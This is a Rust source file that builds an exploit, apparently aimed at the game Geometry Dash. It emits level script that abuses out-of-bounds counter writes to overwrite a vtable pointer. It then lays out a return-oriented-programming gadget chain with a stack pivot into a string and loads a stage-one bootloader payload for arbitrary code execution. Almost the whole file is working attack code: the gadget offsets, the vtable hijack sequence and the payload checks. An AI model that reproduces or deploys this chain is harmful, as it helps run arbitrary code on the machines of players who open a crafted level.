use std::io::Write;
use std::fs::{File, self};

pub mod gadgets;

const GROUP_ARR_OFFSET: i32 = 0x27c;

const SCRATCH: i32 = 0x31E08C;

const CCIMEDELEGATE_CTOR: i32 = 0x282750;
const CCIMEDELEGATE_VTABLE: i32 = 0x12FCFC;

const CCCALLFUNCN_EXECUTE_PTR: i32 = 0x11F910;

pub struct Counter<'a> {
	pub item: i32,
	pub name: &'a str,
	pub stream: &'a File,
	pub current_value: i32,
	pub added: i32,
}

impl<'a> Counter<'a> {
	pub fn new(item: i32, name: &'a str, mut stream: &'a File) -> Self {
		write!(stream, "let {name} = counter(@item({item}))\n{name}.reset()\n").unwrap();
		Self { item, name, stream, current_value: 0, added: 0, }
	}

	pub fn no_reset(item: i32, name: &'a str, mut stream: &'a File) -> Self {
		write!(stream, "let {name} = counter(@item({item}))\n").unwrap();
		Self { item, name, stream, current_value: 0, added: 0, }
	}

	pub fn add(&mut self, n: i32) {
		self.added += n;
		self.current_value += n;
	}

	pub fn set(&mut self, n: i32) {
		self.add(n - self.current_value);
	}

	pub fn flush(&mut self) {
		if self.added == 0 { return; }
		write!(self.stream, "{} += {}\n", self.name, self.added).unwrap();
		self.added = 0;
	}

	pub fn add_now(&mut self, n: i32) {
		self.add(n);
		self.flush();
	}

	pub fn set_now(&mut self, n: i32) {
		self.set(n);
		self.flush();
	}

	pub fn offset(&mut self, c: &mut Self) {
		c.flush();
		self.current_value += c.current_value;
		write!(self.stream, "{} += {}\n", self.name, c.name).unwrap();
	}

	pub fn offset_to(&mut self, c: &mut [&mut Self]) {
		if c.len() == 0 { return; }
		let mut st = String::from(c[0].name);
		c[0].current_value += self.current_value;
		for x in &mut c[1..] {
			st.push(',');
			st.push_str(x.name);
			x.current_value += self.current_value;
		}
		self.flush();
		write!(self.stream, "{}.copy_to([{}])\n", self.name, st).unwrap();
	}

	pub fn dynamic_reset(&mut self) {
		self.added = 0;
		write!(self.stream, "{}.reset()\n", self.name).unwrap();
	}
}

pub fn frame(mut s: &File) {
	write!(s, "let cur = wait_frame(cur)\n").unwrap();
}

#[derive(Debug, Clone, Copy)]
pub enum R {
	None,
	AbsI32(i32),
	AbsU32(u32),
	AbsB([u8; 4]),
	GD(i32),
}

fn rop() -> Vec<R> {
	//let payload_end = SCRATCH + payload_len as i32;

	//R::GD(0x17f83), // mov ebx, eax; call edi; [noret]
	//R::GD(0x269cc) // push ecx; mov ecx, eax; call ebx; [noret]
	/*
	R::GD(0xf719), // mov eax, ecx
		R::GD(0x8efb7), // pop edx
		R::GD(SCRATCH),
		R::GD(0x337f3), // push ecx; mov ecx, edx; call dword ptr [eax]
		R::GD(0xf680), // std::string::operator=(char*)
		 */

	let rop = vec![
		// eax = GameManager*

		R::GD(0x3400d), // pop edi
		R::GD(0x281c9e), // add esp, 8

		R::GD(0x117f7), // mov ecx, eax; call edi; [noret]
		R::None, // skipped by add esp, 8
		R::GD(0x10e5df), // mov eax, dword ptr [ecx + 0x164]; pop ebp; ret 0xc
		R::None, // ebp
		R::GD(0x17f83), // mov ebx, eax; call edi; [noret]
		R::None, // 4
		R::None, // 8
		R::None, // c
		R::None, // skipped by add esp, 8
		R::GD(0x1fc4f4), // mov ecx, dword ptr [ebx + 0x22c]; call edi; [noret]
		R::None, // skipped by add esp, 8
		R::GD(0xca8fe), // mov ecx, dword ptr [ecx + 0x118]; call edi; [noret]
		R::None, // skipped by add esp, 8

		// ecx now has guidelines string, make it the stack
		R::GD(0x7f3cb), // push ecx; pop ebp; add byte ptr [eax], al; push eax; mov ecx, esi; call edi; [noret]
		// no skip here, it skips pushed eax
		R::GD(0x1089), // mov esp, ebp; pop ebp
	];
	
	println!("rop size is {}", rop.len());
	println!("GD rops = {}", rop.iter().filter(|x| matches!(x, R::GD(_))).count());
	rop
}

fn main() {
	let file = File::create("./build/main.spwn").unwrap();
	let bootloader = fs::read(	"./build/bootloader.bin").unwrap();
	
	for (i, &b) in bootloader.iter().enumerate() {
		if b == 0 || b == b',' || b == b';' {
			println!("found invalid byte '{:x}' in stage1 ROP at {}", b, i);
			std::process::abort();
		}
	}

	let mut s = &file;
	write!(s, "{}", fs::read_to_string("./prelude.spwn").unwrap()).unwrap();

	let mut vtable = Counter::no_reset(0 - GROUP_ARR_OFFSET, "vtable", s);
	vtable.current_value = 0x2A5FC4; // GJEffectManager vtable offset

	let mut id = Counter::new(0x1 - GROUP_ARR_OFFSET, "id", s);
	let mut lua_id = Counter::new(0x2 - GROUP_ARR_OFFSET, "lua_id", s);
	let mut callfunc = Counter::new(0xF - GROUP_ARR_OFFSET, "callfunc", s);
	let mut data1 = Counter::new(0x9 - GROUP_ARR_OFFSET, "data1", s);
	let mut this = Counter::new(0xD - GROUP_ARR_OFFSET, "this", s);
	
	let mut gd_based = vec![&mut id, &mut lua_id, &mut callfunc, &mut this, &mut data1];

	for (i, r) in rop().iter().enumerate() {
		let offset = match *r {
			R::None => continue,
			R::AbsI32(i) => i,
			R::AbsU32(i) => i as i32,
			R::AbsB(b) => i32::from_le_bytes(b),
			R::GD(i) => i
		};
		let counter = Box::leak(Box::new(Counter::no_reset(
			i as i32 + 0x24, Box::leak(format!("item_{i}").into_boxed_str()), s
		)));
		if let R::GD(_) = r {
			counter.add_now(offset - vtable.current_value);
			gd_based.push(counter);
		} else {
			counter.add_now(offset);
		}
	}

	vtable.offset_to(&mut gd_based);

	id.set_now(gadgets::BIG_RET);
	lua_id.set_now(0xc4a50); // GameManager::sharedState
	callfunc.set_now(gadgets::MOV_EAX_ECX_POP);
	this.set_now(SCRATCH);
	data1.set_now(gadgets::STACK_PIVOT);

	write!(s, "let cur = wait_frame(2)\n").unwrap();
	frame(s);

	vtable.set_now(CCIMEDELEGATE_CTOR - 0x16C); // 0x16C == CCNode::visit offset in vtable

	frame(s); // wait for CCIMEDelegate::CCIMEDelegate to set vtable

	vtable.current_value = CCIMEDELEGATE_VTABLE;

	vtable.set_now(CCCALLFUNCN_EXECUTE_PTR - 0x16C);
}
